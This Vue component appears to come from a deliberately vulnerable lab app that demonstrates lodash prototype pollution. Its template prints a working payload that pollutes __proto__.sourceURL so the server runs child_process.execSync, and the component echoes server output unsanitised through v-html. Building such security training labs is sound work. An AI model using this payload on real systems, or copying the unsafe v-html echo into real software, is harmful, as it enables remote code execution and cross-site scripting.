<template>
  <div>
    <p>Lodash Prototype (will cause rce)</p>
    <p>Payload(request in burp): {"__proto__": {"sourceURL": "\u000areturn e => { return global.process.mainModule.constructor._load('child_process').execSync('uname -a > 1.txt')}\u000a//"}}</p>
    <input v-model="inputValue">
    <button v-on:click="echoMessage">Echo</button>
    <p v-html="echoValue"/>
  </div>
</template>

<script>
  export default {
    name: "lodash",
    data() {
      return {
        inputValue: "Say something!",
        echoValue: ""
      }
    },
    created: function () {
      this.echoMessage();
    },
    methods: {
      echoMessage() {
        this.$axios.post(`prototype/lodash`,{"msg": this.inputValue},{
          headers: {
            "X-CSRF-TOKEN": sessionStorage.getItem('csrfToken')
          }
        }).then(res => {
          this.echoValue = res.data.msg;
        })
      }
    }
  }
</script>

<style scoped>

</style>
